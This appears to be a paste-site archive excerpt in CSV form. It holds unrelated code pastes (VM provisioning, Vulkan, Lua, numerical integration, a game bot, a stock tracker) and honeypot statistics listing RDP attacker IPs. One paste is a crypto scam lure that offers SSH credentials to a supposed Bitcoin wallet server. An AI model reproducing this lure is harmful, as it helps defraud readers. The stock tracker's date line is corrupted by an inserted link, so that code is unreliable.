    for server, results in scan_results_multi_servers.items():
        print(f'{server}: {results}')

if __name__ == ""__main__"":
    asyncio.run(main())
"
uRvYVa5S,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Friday 29th of December 2023 04:43:08 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-314971"
UiiE2F8B,Untitled,kwest87,C#,Friday 29th of December 2023 04:24:21 AM CDT,"using System;

namespace ConsoleApp16
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();

            int minimumRandomNumber = 1;
            int maximumRandomNumber = 27;
            int resultingNumber = random.Next(minimumRandomNumber, maximumRandomNumber + 1);
            int minimumNaturalNumber = 100;
            int maximumNaturalNumber = 999;
            int quantityNaturalNumber = 0;

            for (int i = 0; i <= maximumNaturalNumber; i += resultingNumber)
            {
                if (i >= minimumNaturalNumber)
                {
                    quantityNaturalNumber++;
                }
            }

            Console.WriteLine($""{quantityNaturalNumber} трехзнаяных натуральных чисел кратных {resultingNumber}"");
        }
    }
}"
FF9XrBhi,Create multiple VM with libvirt,PhoenyxRLP,Python,Friday 29th of December 2023 03:41:39 AM CDT,"#!/usr/bin/python3

import crypt
import yaml
import os
import random
import string
import subprocess
import shutil
import time
import os

def create_iso_from_config(config, directory):
    """"""Erstellt eine cloud-init.iso aus einem YAML-Config-Objekt und speichert sie im gegebenen Verzeichnis.""""""
    content = '#cloud-config\n'
    yaml_content = yaml.dump(config)
    lines = yaml_content.split('\n')[1:-1]
    content += '\n'.join(lines)
    
    with open(f'{directory}/cloud-init.cfg', 'w') as file:
        file.write(content)

    # Erzeugen der ISO
    subprocess.run(
        ['sudo', 'cloud-localds', f'{directory}/cloud-init.iso', f'{directory}/cloud-init.cfg'],
        check=True,
    )

def create_vms(num_vms, base_name, parent_directory):
    for i in range(1, num_vms + 1):
        hostname = f""{base_name}{i:02d}""
        directory = f""{parent_directory}/vm_{hostname}""

        qcow2_path = f""{directory}/{hostname}.qcow2""
        iso_path = f""{directory}/cloud-init.iso""

        # Erstellen der VM
        subprocess.run(
            [
                ""sudo"", 
                ""virt-install"", 
                ""--name"", f""{hostname}"", 
                ""--memory"", ""2048"", 
                ""--disk"", f""{qcow2_path},device=disk,bus=virtio,size=10"", 
                ""--disk"", f""{iso_path},device=cdrom"", 
                ""--os-variant"", ""debian10"",
                ""--virt-type"", ""kvm"",
                ""--graphics"", ""none"",
                ""--network"", ""network=default,model=virtio"",
                ""--import"",
                ""--noautoconsole"",
            ],
            check=True,
        )

        print(f""VM {i} erstellt."")

def get_vm_ips():
    """"""Gibt die IP-Adressen der erstellten VMs zurück.""""""
    try:
        output = subprocess.check_output(['sudo', 'virsh', 'net-dhcp-leases', 'default']).decode('utf-8').split('\n')
        ips = [line.split()[4] for line in output[2:] if line]
        return ips
    except subprocess.CalledProcessError:
        return []

# Hauptteil des Skripts
num_vms = int(input(""Gib die Anzahl der zu erstellenden VMs ein: ""))
print(f""Anzahl der VMs: {num_vms}"")

base_name = input(""Gib den gewünschten Grundnamen für die VMs ein (z.B. debiantestvm): "")
print(f""Grundname für die VMs: {base_name}"")

username = input(""Gib den Usernamen für den System User ein: "")
print(f""Username: {username}"")
password = input(""Gib das Password für den System User ein und merke es dir bitte, da es nicht mehr im Klartext angezeigt wird: "")

random_salt_string = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
print(f""Random Salt String: {random_salt_string}"")

ssh_public_keys = input(""Gib bitte dem Public SSH Key für den User ein: "")
print(f""SSH Public Keys: {ssh_public_keys}"")

# home_direcotry = os.path.expanduser('~')
# parent_directory = ""/home/mehrentraut/cloudimages""
home_directory = os.path.expanduser(""~"")
parent_directory = os.path.join(home_directory, ""cloudimages"")

print(parent_directory)

for i in range(1, num_vms + 1):
    print(f""\nEinstellungen für VM {i}"")

    hostname = f""{base_name}{i:02d}""
    print(f""Hostname für VM {i}: {hostname}"")

    hashed_password = crypt.crypt(password, '$6$rounds=4096$' + random_salt_string)
    print(f""Hashed Password für VM {i}: {hashed_password}"")

    root_user = {
        'name': 'root',
        'ssh_authorized_keys': ssh_public_keys,
    }

    main_user = {
        'name': username,
        'hashed_passwd': hashed_password,
        'sudo': 'ALL=(ALL) NOPASSWD:ALL',
        'shell': ""/bin/bash"",
        'lock-passwd': False,
        'ssh_authorized_keys': ssh_public_keys,
    }

    users = [root_user, main_user]
    print(f""Konfigurierte Benutzer für VM {i}: {users}"")

    config = {
        'hostname': hostname,
        'manage_etc_hosts': False,
        'ssh_pwauth': False,
        'disable_root': True,
        'users': users,
        'locale': 'de_DE.UTF-8',
        'keyboard': {
            'layout': 'de'
        }
    }
    print(f""Konfiguration für VM {i}: {config}"")

    directory = f""{parent_directory}/vm_{hostname}""
    if not os.path.exists(directory):
        os.makedirs(directory)
    print(f""Verzeichnis für VM {i}: {directory}"")

    create_iso_from_config(config, directory)
    print(f""ISO-Datei und Config für VM {i} erstellt."")

    src_qcow2 = ""/home/mehrentraut/Downloads/debian-12-generic-amd64.qcow2""
    dest_qcow2 = f""{parent_directory}/vm_{hostname}/{hostname}.qcow2""
    shutil.copy(src_qcow2, dest_qcow2)
    print(f""QCOW2-Datei für VM {i} kopiert."")

create_vms(num_vms, base_name, parent_directory)

print(""\nWarte 10 Sekunden, um sicherzustellen, dass VMs gestartet sind..."")
time.sleep(10)

# Anzeigen der IP-Adressen der VMs
vm_ips = get_vm_ips()
if vm_ips:
    print(""\nIP-Adressen der erstellten VMs:"")
    for i, ip in enumerate(vm_ips, 1):
        print(f""VM {i}: {ip}"")
else:
    print(""\nEs wurden keine IP-Adressen für die VMs gefunden."")

print(""\nVM-Erstellung abgeschlossen! Hier sind die IP Adressen:"")"
dBXPh226,main.cpp for vlktut as of 2023-12-29,Kitomas,C++,Friday 29th of December 2023 03:04:10 AM CDT,"#include <libxmp/xmp.h>
#define SDL_MAIN_HANDLED
#include <SDL2/SDL.h>
#include <SDL2/SDL_vulkan.h> //why isn't this included inside SDL.h?
#include <glm/glm.hpp>
#include <vulkan/vulkan.h>

#include <iostream>
#include <stdexcept>
#include <cstdlib>

#include <vk/vk_all.hpp>
#include <sfx.hpp>
#include <file.hpp>
#include <xmp.hpp>


class HelloTriangleApplication {
public:
  void run(Uint32 winW = 640, Uint32 winH = 480){
    _initWindow(winW, winH);
    _initVulkan();
    _mainLoop();
    _cleanup();
  }


private:
  SDL_Window* _window = nullptr;
  Uint32 _windowID = 0;

  VkInstance _instance = nullptr;


  void _createInstance(){
    VkApplicationInfo appInfo{};
    appInfo.sType              = VK_STRUCTURE_TYPE_APPLICATION_INFO;
    appInfo.pApplicationName   = ""cool triangle"";
    appInfo.applicationVersion = VK_MAKE_VERSION(1,0,0);
    appInfo.pEngineName        = ""No Engine"";
    appInfo.engineVersion      = VK_MAKE_VERSION(1,0,0);
    appInfo.apiVersion         = VK_API_VERSION_1_0;


    bool success;  VkResult result;

    Uint32 extensionsReq_len = 0; //# of required extensions
    success = SDL_Vulkan_GetInstanceExtensions(_window, &extensionsReq_len, nullptr);
    if(!success) throw SDL_GetError();
    std::vector<const char*> extensionsReq(extensionsReq_len);
    success = SDL_Vulkan_GetInstanceExtensions(_window, &extensionsReq_len, extensionsReq.data());
    if(!success) throw SDL_GetError();

    Uint32 extensionsHas_len = 0; //# of available extensions
    result = vkEnumerateInstanceExtensionProperties(nullptr, &extensionsHas_len, nullptr);
    if(result != VK_SUCCESS) throw ""vkEnumerateInstanceExtensionProperties() failed"";
    std::vector<VkExtensionProperties> extensionsHas(extensionsHas_len);
    result = vkEnumerateInstanceExtensionProperties(nullptr, &extensionsHas_len, extensionsHas.data());
    if(result != VK_SUCCESS) throw ""vkEnumerateInstanceExtensionProperties() failed"";


    //make sure to account for # of desired extensions too when they're added
    if(extensionsReq_len > extensionsHas_len)
      throw ""# of required extensions > # of available extensions"";

    //copy everything from Req to Want
    Uint32 extensionsWant_len = extensionsReq_len; //# of desired extensions
    std::vector<std::string> extensionsWant;
    extensionsWant.reserve(extensionsHas_len);

    for(const char* extReq : extensionsReq)
      extensionsWant.emplace_back(extReq);
    //then, append any desired extensions to extension
    //extensionsWant.emplace_back(""VK_EXT_swapchain_colorspace"");
    //...
    //extensionsWant_len += 1; //+= <# of desired extensions>;

    //make sure extensionsWant is a superset of extensionsHas
    for(std::string& extWant : extensionsWant){
      bool foundAMatch = false;
      for(VkExtensionProperties& extHas : extensionsHas){
        if(extWant.compare(extHas.extensionName) == 0  ||  extWant == """"){
          foundAMatch = true;  break;
        }
      }
      if(!foundAMatch) throw ""extensionsHas doesn't contain extensionsWant"";
    }


    //translate extensionsWant to a C string array for use in vkCreateInstance
    Uint32 extensions_len = extensionsWant_len; //for consistency
    std::vector<const char*> extensions(extensionsWant_len);
    for(Uint32 i=0; i<extensionsWant_len; ++i)
      extensions[i] = extensionsWant[i].c_str();


    VkInstanceCreateInfo createInfo{};
    createInfo.sType                   = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;
    createInfo.pApplicationInfo        = &appInfo;
    createInfo.enabledLayerCount       = 0; //TBD
    createInfo.enabledExtensionCount   = extensions_len;
    createInfo.ppEnabledExtensionNames = extensions.data();

    result = vkCreateInstance(&createInfo, nullptr, &_instance);
    if(result == VK_ERROR_EXTENSION_NOT_PRESENT) throw ""vkCreateInstance() = VK_ERROR_EXTENSION_NOT_PRESENT"";
    if(result != VK_SUCCESS) throw ""vkCreateInstance() failed"";


    //debug print stuff
    SDL_Log(""# of required extensions = %u:"",extensionsReq_len);
    for(Uint32 i=0; i<extensionsReq_len; ++i) SDL_Log(""  %u: \""%s\"""",i,extensionsReq[i]);
    SDL_Log(""# of available extensions = %u:"",extensionsHas_len);
    for(Uint32 i=0; i<extensionsHas_len; ++i) SDL_Log(""  %2u: \""%s\"" (%u)"",i,extensionsHas[i].extensionName,extensionsHas[i].specVersion);
    SDL_Log(""# of desired extensions = %u:"",extensionsWant_len);
    for(Uint32 i=0; i<extensionsWant_len; ++i) SDL_Log(""  %2u: \""%s\"""",i,extensionsWant[i].c_str());
  }


  void _initWindow(Uint32 winW = 640, Uint32 winH = 480){
    _window = SDL_CreateWindow(""a cool triangle"",
                               SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED,
                               winW, winH, SDL_WINDOW_VULKAN);
    if(_window == nullptr) throw SDL_GetError();
    _windowID = SDL_GetWindowID(_window);
    if(_windowID == 0) throw SDL_GetError();
  }


  void _initVulkan(){
    _createInstance();
  }


  void _mainLoop(){
    bool running = true;
    SDL_Event event;

    while(running){
      while(SDL_PollEvent(&event) && running){
        switch(event.type){
        case SDL_WINDOWEVENT:
          //the window id isn't checked here, so it could theoretically
           //be another window entirely lol
          if(event.window.event == SDL_WINDOWEVENT_CLOSE) running = false;
        }
      }
      SDL_Delay(16);
    }
  }


  void _cleanup(){
    vkDestroyInstance(_instance, nullptr);
    _instance = nullptr;
    if(_window != nullptr){
      SDL_DestroyWindow(_window);
      _window = nullptr;
    }
  }
};



#define M_2PI (3.1415927f*2)
float get_sin(float hertz = 440, int increment = 1){
  static int index = 0;
  float value = SDL_sinf( ((float)index/44100)*M_2PI*hertz );
  index += increment;
  return value;
}

//(t>>4)*(t>>3)|t>>2
float get_sample(){
  static int _t = 0;
  int t = _t * (8000.0f/44100);
  t *= 106.0/117;

  Uint8 _value = t*(t&16384?6:5)*(4-(1&t>>8))>>(3&t>>9)|t>>(t&4096?3:4);
  //Uint8 _value = t<<2^t>>4^t<<4&t>>8|t<<1&-t>>4;
  float value = _sfx_u8conv(_value);

  ++_t;
  return value;
}


void auxCallback(void* userdata, void* _stream, int size){
  int       len = size/sizeof(float);
  float* stream = (float*)_stream;
  for(int i=0; i<len; ++i){
    //stream[i] = get_sin()*0.25f;
    stream[i] = get_sample()*0.2f;

  }
}




int main(int argc, char** argv){
  if(SDL_Init(SDL_INIT_VIDEO|SDL_INIT_AUDIO)) return -1;

  //wip vulkan stuff; ignore
  HelloTriangleApplication app;
  try {
    app.run();
  } catch(const std::exception& e){
    std::cerr << e.what() << std::endl;
    return EXIT_FAILURE;
  } catch(const char* e){
    std::cout << ""error = "" << e << std::endl;
    return EXIT_FAILURE;
  }


/*
  try {

    sfx_class sfx(64); //a maximum of 64 sound effects tracks
    sfx_pcm cow(""dat/Cow.kpm"",&sfx); //load sound effect of a cow moo
    xmp_class xmp(&sfx); //create music thingy
    xmp.loadModule(""dat/rob_me_if_you_can.xm""); //load music

    sfx.pauseDeviceAndWait(false); //unpause device, and wait for fade-in

    //play cow moo and play music for about 10 seconds
    xmp.startPlayer();
    cow.play();
    SDL_Delay(10000);

    sfx.pauseDeviceAndWait(true); //pause device, and wait for fade-out
    xmp.endPlayer();

  } catch(const char* e){
    std::cout << ""error = "" << e << std::endl;
    return EXIT_FAILURE;
  }

*/

  SDL_Quit();
  return EXIT_SUCCESS;
}
"
wufKyCRc,Hidden Dev Noted App,killermanwithacookie,Lua,Thursday 28th of December 2023 11:02:04 PM CDT,"
game.Players.PlayerAdded:Connect(function(plr) -- Fires when a player joins the game
	
	repeat wait() until plr.Character -- Waits until the player's character loads in(Extra verification)
	
plr.CharacterAdded:Connect(function(Char) -- Fires when the character loads in

	for i,v in pairs(game.Workspace:GetChildren()) do  -- Loops between all the parts in the workspace
		if v.Name == ""Checkpoint"" then -- Finds anything in workspace called ""Checkpoint""

			if v.Stage.Value == plr.leaderstats.Stage.Value then -- Checks the ""Stage"" value in the checkpoint matches the players stage if so run the code below

				repeat wait() -- Repeats the loop until the player spawns in the correct checkpoint
					Char.HumanoidRootPart.CFrame = v.Spawn.CFrame -- Teleports player to the checkpoint
					until Char.HumanoidRootPart.CFrame == v.Spawn.CFrame -- Doesn't stop loop until Teleports player to the checkpoint
					
				
				

			end
		end
	end

end)
end)"
rBJSWM16,functions.h,tasher13k,C++,Thursday 28th of December 2023 08:58:14 PM CDT,"#ifndef TASK5_1_FUNCTIONS_H
#define TASK5_1_FUNCTIONS_H
#include <boost/numeric/ublas/matrix.hpp>
#include <boost/numeric/ublas/vector.hpp>
namespace params{
    extern double a,b;
    extern int n;
}

using namespace boost::numeric::ublas;

vector<double> get_qf_coeffs(std::vector<double> &nodes, vector<double> moments);
void find_moments(vector<double> &moments);
double main_function(double x, int k = 0);

double calculation_for_iqf();
#endif //TASK5_1_FUNCTIONS_H
"
pN4bfC0D,iqf_computation.cpp,tasher13k,C++,Thursday 28th of December 2023 08:57:29 PM CDT,"#include ""functions.h""

void get_nodes_for_iqf(std::vector<double> &nodes){
    double h = (params::b-params::a) / params::n;
    for(unsigned i = 0; i <= params::n; ++i){
        nodes[i] = params::a + i * h;
    }
}

double calculation_for_iqf(){
    std::vector<double> nodes(params::n);
    get_nodes_for_iqf(nodes);

    vector<double> moments(2 * params::n);
    find_moments(moments); //находим моменты для весовой ф-ии

    auto result_coeffs = get_qf_coeffs(nodes, moments);

    std::cout << ""\nКоэффициенты квадратурной формулы (Аi): "";
    for(auto cur_node : result_coeffs){
        std::cout << cur_node << "" "";
    }

    double result_of_integration = 0;

    for(int i = 0; i < params::n; ++i){
        result_of_integration += result_coeffs[i] * main_function(nodes[i]);
    }

    return result_of_integration;
}"
brfTwPgx,main.cpp,tasher13k,C++,Thursday 28th of December 2023 08:56:50 PM CDT,"#include <iostream>
#include <cmath>
#include <vector>

#include <boost/numeric/ublas/io.hpp>
#include <boost/version.hpp>

#include ""boost_solve.h""
#include ""functions.h""

namespace params{
    double a,b;
    int n;
}

using namespace boost::numeric::ublas;

constexpr double epsilon = 1.0e-6;

double weight_function(double x){
    return sqrt(x);
    //return sin(2*x);
}

double main_function(double x, int k){
    return sin(x);
}

double moment_function(double x, int k){
    return weight_function(x) * pow(x, k);
}

double integrated_f(){
    return cos(params::a) - cos(params::b);
}

double poly_function_for_equation(double x, vector<double> &node_coeffs){
    double result_poly = pow(x, params::n);
    int counter = 0;

    //std::cout << ""\nВид многочлена:"" << std::endl;
    while (counter < params::n){
        //std::cout << pow(x, params::n - counter - 1) * node_coeffs[counter] << "" + "";
        result_poly += pow(x, params::n - counter - 1) * node_coeffs[counter];
        ++counter;
    }
    //std::cout << std::endl;

    return result_poly;
}

using pointer_to_some_function = double (*)(double, int);


double simpsonsIntegration(pointer_to_some_function f, double a, double b, int n, int k = 0) {
    const double h = (b - a) / n;
    double sum = f(a, k) + f(b, k);
    for (int i = 1; i < n; i += 2) {
        sum += 4 * f(a + i * h, k);
    }
    for (int i = 2; i < n - 1; i += 2) {
        sum += 2 * f(a + i * h, k);
    }
    return sum * h / 3.0;
}

void find_moments(vector<double> &moments){ //использование формулы Симпсона из задания 4

    for(int i = 0; i < moments.size(); ++i){
        moments[i] = simpsonsIntegration(moment_function, params::a, params::b, params::n, i);
    }

    std::cout << ""Моменты"" << std::endl;
    for(auto cur_moment : moments){
        std::cout << cur_moment << ""\n"";
    }
    std::cout << std::endl;
}

vector<double> solve_slae(vector<double> &moments) {

    matrix<double> A(params::n, params::n);
    vector<double> v(params::n);

    for (unsigned i = 0; i < A.size1(); ++i)
        for (unsigned j = 0; j < A.size2(); ++j)
            A(i, j) = moments[params::n - 1 + i - j];

    for (unsigned i = 0; i < v.size(); ++i)
        v(i) = -moments[params::n + i];

    //вывод матрицы
    std::cout << ""Матрица имеет вид: "" << A << std::endl;
    std::cout << ""Вектор имеет вид: "" << v << std::endl;

    return boost::math::tools::solve(A, v);
}

vector<double> kramer_solve_slae(vector<double> &moments) { //решение СЛАУ методом Гаусса

    vector<double> result_vector(params::n);

    double denominator = moments[1] * moments[1] - moments[2] * moments[0];

    result_vector(0) = (moments[0] * moments[3] - moments[2] * moments[1]) / denominator;
    result_vector(1) = (moments[2] * moments[2] - moments[3] * moments[1]) / denominator;
    return result_vector;
}

//Метода секущих для уточнения корней
double secant(double A, double B, vector<double> &node_coeffs) {
    double xkmin1 = A;
    double xk = B;
    double xkplus1 = 0;

    while (std::abs(xk - xkmin1) >= epsilon) {
        xkplus1 = xk - poly_function_for_equation(xk, node_coeffs) * (xk - xkmin1) / (poly_function_for_equation(xk, node_coeffs) - poly_function_for_equation(xkmin1, node_coeffs));
        xkmin1 = xk;
        xk = xkplus1;
    }
    return xkplus1;
}

std::vector<double> rootsSeparation(double A, double B, double h, vector<double> &coeffs_for_nodes) {
    bool check = false;
    std::vector<double> result_vector;

    for (double i = A; i <= B; i += h) {
        if (poly_function_for_equation(i, coeffs_for_nodes) * poly_function_for_equation(i + h, coeffs_for_nodes) < 0) {
            std::cout << ""Отрезок, содержащий корень нечетной кратности : ["" << i << "", "" << i + h << ""]\n"";
            result_vector.emplace_back(secant(i, i + h, coeffs_for_nodes)); // Уточнение корней разными методами
            check = true;
        }
    }
    if (!check) {
        std::cout << ""Корни не найдены"";
    }

    return result_vector;
}

vector<double> get_qf_coeffs(std::vector<double> &nodes, vector<double> moments){

    matrix<double> x_pow_s_matrix(nodes.size(), nodes.size());

    for (unsigned i = 0; i < x_pow_s_matrix.size1(); ++i)
        for (unsigned j = 0; j < x_pow_s_matrix.size2(); ++j)
            x_pow_s_matrix(i, j) = pow(nodes[j], i);

    moments.resize(nodes.size());

    std::cout << ""А = "" << x_pow_s_matrix << std::endl;
    std::cout << ""moments_vector = "" << moments << std::endl;

    return boost::math::tools::solve(x_pow_s_matrix, moments);
}

double calculation_for_qfmadp(){
    vector<double> moments(2 * params::n);

    find_moments(moments); //находим моменты для весовой ф-ии
    vector<double> coeffs_for_nodes = solve_slae(moments); //kramer_solve_slae(moments);

    std::cout << ""Коэффициенты ai: "";
    for(auto cur_coeff : coeffs_for_nodes){
        std::cout << cur_coeff << ""; "";
    }
    std::cout << std::endl;

    auto h = (params::b - params::a) / params::n;
    std::vector<double> nodes = rootsSeparation(params::a, params::b, h, coeffs_for_nodes);

    std::cout << ""\nУзлы: "";
    for(auto cur_node : nodes){
        std::cout << cur_node << "" "";
    }
    std::cout << std::endl;

    auto result_coeffs = get_qf_coeffs(nodes, moments);

    std::cout << ""\nКоэффициенты квадратурной формулы (Аi): "";
    for(auto cur_node : result_coeffs){
        std::cout << cur_node << "" "";
    }
    std::cout << std::endl;

    double result_of_integration = 0;

    for(int i = 0; i < params::n; ++i){
        result_of_integration += result_coeffs[i] * main_function(nodes[i]);
    }

    return result_of_integration;
}

int main() {

    std::cout << ""Using Boost "" << BOOST_VERSION / 100000     << ""."";  // major version
    std:: cout << BOOST_VERSION / 100 % 1000 << ""."";  // minor version
    std::cout << BOOST_VERSION % 100 << std::endl;

    std::cout.precision(18); // Для изменения количества знаков у double после запятой

    std::cout << ""Введите a, b - границы интервала: "";
    std::cin >> params::a >> params::b;
    std::cout << ""Введите n - число узлов: "";
    std::cin >> params::n;

    std::cout << ""\nВычисления для ИКФ\n"";
    auto iqf_result = calculation_for_iqf();
    std::cout << ""\nВычисления для КФНАСТ\n"";
    auto kfnast_result = calculation_for_qfmadp();

    std::cout << ""\nРезультат ИКФ: "" << iqf_result << ""\nМодуль погрешности: "" << std::abs(iqf_result - integrated_f()) << std::endl;
    std::cout << ""\nРезультат КФНАСТ: "" << kfnast_result << ""\nМодуль погрешности: "" << std::abs(kfnast_result - integrated_f()) << std::endl;
    return 0;

}
"
HtD2NWbB,Financial Freedom Bot,xGHOSTSECx,Python,Thursday 28th of December 2023 06:58:40 PM CDT,"# Unlock Financial Insights with FinancialFreedom

# FinancialFreedom is your key to unlocking valuable insights into the dynamic world of stocks and cryptocurrencies. Imagine effortlessly staying informed about the latest market trends, all at your fingertips. This Python tool seamlessly integrates with popular libraries to provide real-time data on stock prices. Through a user-friendly command-line interface, you can effortlessly query specific stocks or cryptocurrencies, receive instant updates on price changes, and even analyze the probability of price increases. FinancialFreedom empowers both seasoned investors and curious learners by making financial data accessible and actionable.

# This tool goes beyond traditional market tracking by dynamically retrieving and organizing data in a SQLite database. With its intuitive design, users can easily navigate through the command-line interface, executing actions like querying specific stocks or assessing the likelihood of price changes. FinancialFreedom simplifies financial data analysis, ensuring that you can make informed decisions in the ever-evolving landscape of stocks and cryptocurrencies. Explore the world of finance with confidence, armed with the insights provided by FinancialFreedom.

# Import necessary libraries
import sqlite3
from googlesearch import search
import yfinance as yf
import datetime

# Initialize SQLite database
conn = sqlite3.connect('financial_data.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS stocks(
                id INTEGER PRIMARY KEY,
                symbol TEXT,
                price REAL,
                date TEXT)''')

# Function to query and parse financial data
def query_stock_data(query):
    results = search(query, num=1, stop=1)
    for url in results:
        stock_symbol = url.split('/')[-1].split(':')[0]
        stock_info = yf.Ticker(stock_symbol)
        hist = stock_info.history(period=""1d"")
        current_price = hist['Close'][0]
        date = https://t.co/2SOskHf38t().strftime(""%Y-%m-%d"")
        check_price_change_and_update_database(stock_symbol, current_price, date)

# Function to check price change and update database
def check_price_change_and_update_database(symbol, price, date):
    c.execute(""SELECT price FROM stocks WHERE symbol=?"", (symbol,))
    previous_price = c.fetchone()
    if previous_price:
        previous_price = previous_price[0]
        if price != previous_price:
            print(f""{symbol} price change detected! Previous price: {previous_price}, Current price: {price}"")
            c.execute(""UPDATE stocks SET price=?, date=? WHERE symbol=?"", (price, date, symbol))
        else:
            print(f""{symbol} price remains the same. No change detected."")
    else:
        print(f""Adding {symbol} to the database with price: {price}"")
        c.execute(""INSERT INTO stocks (symbol, price, date) VALUES (?, ?, ?)"", (symbol, price, date))
    conn.commit()

# Function to analyze price change probability
def analyze_price_change_probability():
    c.execute(""SELECT symbol, price, date FROM stocks"")
    data = c.fetchall()
    increase_count = 0
    total_count = 0
    for row in data:
        total_count += 1
        symbol, price, date = row
        if price > 65:
            increase_count += 1
    probability = (increase_count / total_count) * 100
    print(f""The probability of stocks/crypto with price > 65% likely to increase: {probability:.2f}%"")

# Help menu with examples
def help_menu():
    print(""Welcome to the Financial Data Tool!\n"")
    print(""Usage:"")
    print(""python financial_data_tool.py <action> <query>\n"")
    print(""Actions:"")
    print(""- query: Query financial data for a specific stock or cryptocurrency"")
    print(""- analyze: Analyze the probability of price increase for stocks/cryptocurrency\n"")
    print(""Examples:"")
    print(""Query financial data for Apple Inc. stock:\n python financial_data_tool.py query 'Apple Inc. stock'"")
    print(""Analyze the probability of price increase:\n python financial_data_tool.py analyze"")

# Main execution
if __name__ == '__main__':
    import sys

    if len(sys.argv) < 3:
        help_menu()
    else:
        action = sys.argv[1]
        query = ' '.join(sys.argv[2:])

        if action == 'query':
            query_stock_data(query)
        elif action == 'analyze':
            analyze_price_change_probability()"
4zgkUZun,Basic Shrimp Power Fisher,LFCxx,Java,Thursday 28th of December 2023 06:37:55 PM CDT,"package PowerFisher;

import java.awt.Color;
import java.awt.Graphics;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import net.runelite.api.ChatMessageType;
import simple.hooks.filters.SimpleSkills.Skills;
import simple.hooks.queries.SimpleEntityQuery;
import simple.hooks.queries.SimpleItemQuery;
import simple.hooks.scripts.Category;
import simple.hooks.scripts.ScriptManifest;
import simple.hooks.simplebot.ChatMessage;
import simple.hooks.wrappers.SimpleItem;
import simple.hooks.wrappers.SimpleNpc;
import simple.robot.script.Script;
//This will be used for an AIO type of fisher for osrsps written by satan666
@ScriptManifest(author = ""Satan666"", name = ""Shrimp Power Fisher"", category = Category.FISHING, description = ""Automated shrimp fishing script"", version = ""0.1"", servers = {""OldschoolRSPS""}, discord = ""kavinsky_crowley"")
public class Main extends Script implements MouseListener {
    private int fishingSpotId = 1518;
    private long lastFishingAttemptTime = 0;
    private final long FISHING_ATTEMPT_COOLDOWN = 20000;
    private int fishCaught = 0;
    private long startTime;
    private int startFishingXp;
    private int fishingXpGained;

    @Override
    public void onExecute() {
        this.startTime = System.currentTimeMillis();
        this.startFishingXp = this.ctx.skills.experience(Skills.FISHING);
        this.ctx.updateStatus(""Starting Shrimp Power Fisher"");
    }

    @Override
    public void onProcess() {
        if (this.ctx.inventory.populate().population() == 28) {
            SimpleItemQuery<SimpleItem> itemsToDrop = this.ctx.inventory.populate().filter(i -> i.getId() != 303);
            for (SimpleItem item : itemsToDrop) {
                item.click(""Drop"");
                this.ctx.sleep(100);
            }
            lastFishingAttemptTime = 0;
        } else {

            if (System.currentTimeMillis() - lastFishingAttemptTime > FISHING_ATTEMPT_COOLDOWN) {
                SimpleNpc fishingSpot = (SimpleNpc) this.ctx.npcs.populate().filter(fishingSpotId).nearest().next();
                if (fishingSpot != null && fishingSpot.validateInteractable()) {
                    fishingSpot.click(""Net"");
                    lastFishingAttemptTime = System.currentTimeMillis();
                    this.ctx.sleep(1000);
                }
            }
        }
    }

    @Override
    public void onChatMessage(ChatMessage chatMessage) {
        String message = chatMessage.getMessage().toLowerCase();

        if (message.contains(""you catch some shrimps"")) {
            fishCaught++;
        }
    }

    @Override
    public void paint(Graphics graphics) {
        this.fishingXpGained = this.ctx.skills.experience(Skills.FISHING) - this.startFishingXp;
        long upTime = System.currentTimeMillis() - this.startTime;
        graphics.setColor(Color.BLACK);
        graphics.drawString(""Time Running: "" + formatTime(upTime), 20, 20);
        graphics.drawString(""Fish Caught: "" + fishCaught, 20, 35);
        graphics.drawString(""XP Gained: "" + fishingXpGained, 20, 50);
    }

    private String formatTime(long ms) {
        int seconds = (int) (ms / 1000) % 60;
        int minutes = (int) ((ms / (1000 * 60)) % 60);
        int hours = (int) ((ms / (1000 * 60 * 60)) % 24);
        return String.format(""%02d:%02d:%02d"", hours, minutes, seconds);
    }

    // MouseListener methods (Not yet implemented)
    @Override
    public void mouseClicked(MouseEvent e) {}

    @Override
    public void mousePressed(MouseEvent e) {}

    @Override
    public void mouseReleased(MouseEvent e) {}

    @Override
    public void mouseEntered(MouseEvent e) {}

    @Override
    public void mouseExited(MouseEvent e) {}

    @Override
    public void onTerminate() {
        this.ctx.updateStatus(""Stopping Shrimp Power Fisher"");
    }
}
"
unsT0gZA,2023-12-28_stats.json,rdp_snitch,JSON,Thursday 28th of December 2023 06:18:27 PM CDT,"{
  ""ip"": {
    ""87.251.75.145"": 12,
    ""45.227.254.48"": 6,
    ""198.235.24.213"": 9,
    ""62.204.41.208"": 18,
    ""139.162.5.35"": 21,
    ""43.134.171.213"": 3,
    ""167.94.138.35"": 3,
    ""94.74.64.196"": 12,
    ""103.20.102.235"": 3,
    ""147.78.47.32"": 3,
    ""87.251.75.64"": 3,
    ""45.79.103.72"": 6,
    ""63.135.161.94"": 3,
    ""185.170.144.3"": 6,
    ""193.37.69.79"": 6,
    ""198.235.24.183"": 9,
    ""164.92.94.245"": 6,
    ""31.43.185.3"": 6,
    ""194.165.16.72"": 6,
    ""213.109.202.232"": 9,
    ""81.19.135.47"": 9,
    ""165.154.129.130"": 3,
    ""46.219.77.107"": 3,
    ""58.218.204.183"": 9,
    ""185.170.144.113"": 9,
    ""198.235.24.21"": 9,
    ""146.190.74.163"": 12,
    ""139.144.171.21"": 3,
    ""81.143.229.7"": 15,
    ""103.78.16.176"": 3,
    ""81.19.135.2"": 9,
    ""45.130.83.36"": 3,
    ""118.123.105.93"": 6,
    ""194.165.17.21"": 18,
    ""74.105.22.130"": 18,
    ""190.85.232.116"": 3,
    ""45.227.254.26"": 6,
    ""205.210.31.163"": 9
  },
  ""asn"": {
    ""AS208091"": 21,
    ""AS267784"": 12,
    ""AS396982"": 36,
    ""AS59425"": 18,
    ""AS63949"": 30,
    ""AS132203"": 3,
    ""AS398324"": 3,
    ""AS136907"": 12,
    ""AS140817"": 3,
    ""AS209588"": 21,
    ""AS206092"": 6,
    ""AS197414"": 15,
    ""AS14061"": 18,
    ""AS211736"": 6,
    ""AS48721"": 24,
    ""AS208312"": 9,
